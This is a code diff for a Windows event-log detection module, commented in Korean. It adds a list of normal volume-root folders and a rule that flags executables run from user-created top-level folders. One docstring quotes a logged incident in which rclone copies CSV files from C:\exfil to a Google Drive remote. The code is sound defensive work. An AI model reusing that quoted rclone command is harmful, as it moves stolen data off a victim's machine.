@@ -47,6 +47,8 @@ __all__ = [
     "FN_FIELDS",
     "MISMATCH_PAIRS",
     "SHARED_PROGRAM_DIRS",
+    "DEFAULT_KNOWN_VOLUME_ROOTS",
+    "known_volume_roots",
     "VocabularyError",
     "Clause",
     "FlagRule",
@@ -518,6 +520,99 @@ SHARED_PROGRAM_DIRS = frozenset(
 )
 
 
+#: 볼륨 루트 바로 아래에 **윈도우가 스스로 만드는** 폴더. 소문자, 구분자 없음.
+#:
+#: ``_outside_known_volume_root`` 가 "이 최상위 폴더를 누가 만들었나"를 볼 때
+#: 쓰는 기본값이다. ``SHARED_PROGRAM_DIRS`` 와 목적이 다르다 — 저쪽은 부모와
+#: 자식이 같은 설치 트리인지 보는 것이다.
+#:
+#: **여기에는 어느 환경에나 있는 것만 적는다.** 그 사이트의 앱이 볼륨 루트에
+#: 설치돼 있으면 ``_flags.yaml`` 의 ``known_volume_roots:`` 에 적는다. 이
+#: 상수에 적으면 한 표본에서만 맞는 이름이 코드에 남는다.
+DEFAULT_KNOWN_VOLUME_ROOTS = frozenset(
+    {
+        "windows",
+        "winnt",
+        "program files",
+        "program files (x86)",
+        "programdata",
+        "users",
+        "documents and settings",
+        "$recycle.bin",
+        "system volume information",
+        "perflogs",
+        "recovery",
+        "boot",
+        "msocache",
+    }
+)
+
+
+@functools.lru_cache(maxsize=None)
+def known_volume_roots(directory: str | None = None) -> frozenset[str]:
+    r"""볼륨 루트에서 정상으로 볼 최상위 폴더. ``_flags.yaml`` 을 얹는다.
+
+    ``privileged_groups`` 와 같은 규약이다 — 판정은 파이썬이 하고 **그
+    사이트에서 무엇이 정상인가는 YAML 이 정한다.**
+
+    기본값을 **대체하지 않고 더한다.** 사이트 목록이 윈도우 폴더를 다시
+    적어야 한다면, 한 줄 빠뜨리는 순간 ``C:\Windows`` 전체가 걸린다.
+    """
+    path = Path(directory or mappings_dir()) / "_flags.yaml"
+    if not path.is_file():
+        return DEFAULT_KNOWN_VOLUME_ROOTS
+    data = yaml.safe_load(path.read_text(encoding="utf-8")) or {}
+    extra = {str(n).strip().lower().strip("\\") for n in (data.get("known_volume_roots") or [])}
+    return DEFAULT_KNOWN_VOLUME_ROOTS | {name for name in extra if name}
+
+
+
+def _outside_known_volume_root(record: dict[str, Any], ctx: Context) -> bool:
+    r"""실행 파일이 **사람이 만든 최상위 폴더** 안에 있는가.
+
+    ``execution_from_unusual_path`` 는 "권한 없이 파일을 떨어뜨릴 수 있는
+    자리"를 열거해 왔습니다. 열거는 아는 자리만 잡습니다 — ``C:\Temp`` 를
+    넣으려고 ``:\temp\`` 를 더한 것이 2026-09-09 이고, 다음 사건은
+    ``C:\exfil`` 이었습니다(``K2L-20260908``):
+
+        SYSMON#42151  flags=[]
+          "C:\exfil\rclone.exe" --config ... copy C:\exfil\ gdrive:K001-exfil
+          --include *.csv
+
+    **여기에 ``:\exfil\`` 을 적으면 이 표본에서만 맞는 값이 남습니다.**
+    그것은 이 파일이 하지 말라고 적어 둔 것이고
+    (``mappings/_attention_signals.yaml`` 의 머리말), 다음 폴더 이름은 또
+    다를 것입니다. 그래서 이름이 아니라 **자리**를 봅니다 — 윈도우가 만드는
+    최상위 폴더는 정해져 있고(``known_volume_roots``), 그 밖의 최상위 폴더는
+    누군가 만든 것입니다.
+
+    **부정 조건인데 전량을 잡지 않습니다.** 이 파일이 부정을 경계하는 이유는
+    "형식 가정이 틀리면 전량이 걸린다"인데(``field_startswith`` 의 설명),
+    여기서는 형식 가정이 **긍정 쪽**에 있습니다. ``X:\<폴더>\`` 꼴로 읽히지
+    않으면 참이 아니라 **거짓**을 냅니다. 파서가 Image 를 다른 형태로 주면
+    이 handler 는 조용히 0건이 되지, 18,784건이 되지 않습니다.
+
+    실측(세 노드): 139건(0.74%) — ``temp`` 63, ``exfil`` 44, ``sql2025`` 27,
+    ``sql2022`` 5. 앞의 ``temp`` 는 이미 ``:\temp\`` 가 잡던 것이라 실제
+    증가분은 76건입니다. ``sql2025``·``sql2022`` 는 SQL Server 를 볼륨
+    루트에 설치한 것이라 오탐이지만, **이 flag 는 악성 판정이 아니라 "정상
+    설치 자리가 아니다"까지만 말합니다.** 사람이 만든 폴더라는 판정은 맞고,
+    그 뜻을 정하는 것은 05단계입니다.
+    """
+    fields = record.get("fields") or {}
+    image = str(fields.get("Image") or "").strip().lower()
+    # ``X:\`` 로 시작하고 그 아래 폴더가 하나는 있어야 한다. UNC(``\\``)는
+    # 드라이브 문자가 없으므로 여기 안 걸리고, 위 절의 ``\\`` 가 맡는다.
+    if len(image) < 3 or image[1:3] != ":\\" or not image[0].isalpha():
+        return False
+    head, sep, _rest = image[3:].partition("\\")
+    if not sep or not head:
+        # 볼륨 루트에 그냥 놓인 ``C:\evil.exe``. 폴더가 없으니 이 판정의
+        # 대상이 아니다 — 잡고 싶으면 별도의 절로 적는다.
+        return False
+    return head not in known_volume_roots()
+
+
 def _parent_is_another_program(record: dict[str, Any], ctx: Context) -> bool:
     r"""부모가 **다른 프로그램**인가. 같은 프로그램의 내부 동작이면 아니다.
 
@@ -576,6 +671,7 @@ HANDLERS: dict[str, Callable[[dict[str, Any], Context], bool]] = {
     "target_is_privileged_group": _target_is_privileged_group,
     "outside_selected_time_range": _outside_selected_time_range,
     "parent_is_another_program": _parent_is_another_program,
+    "outside_known_volume_root": _outside_known_volume_root,
 }
 
 
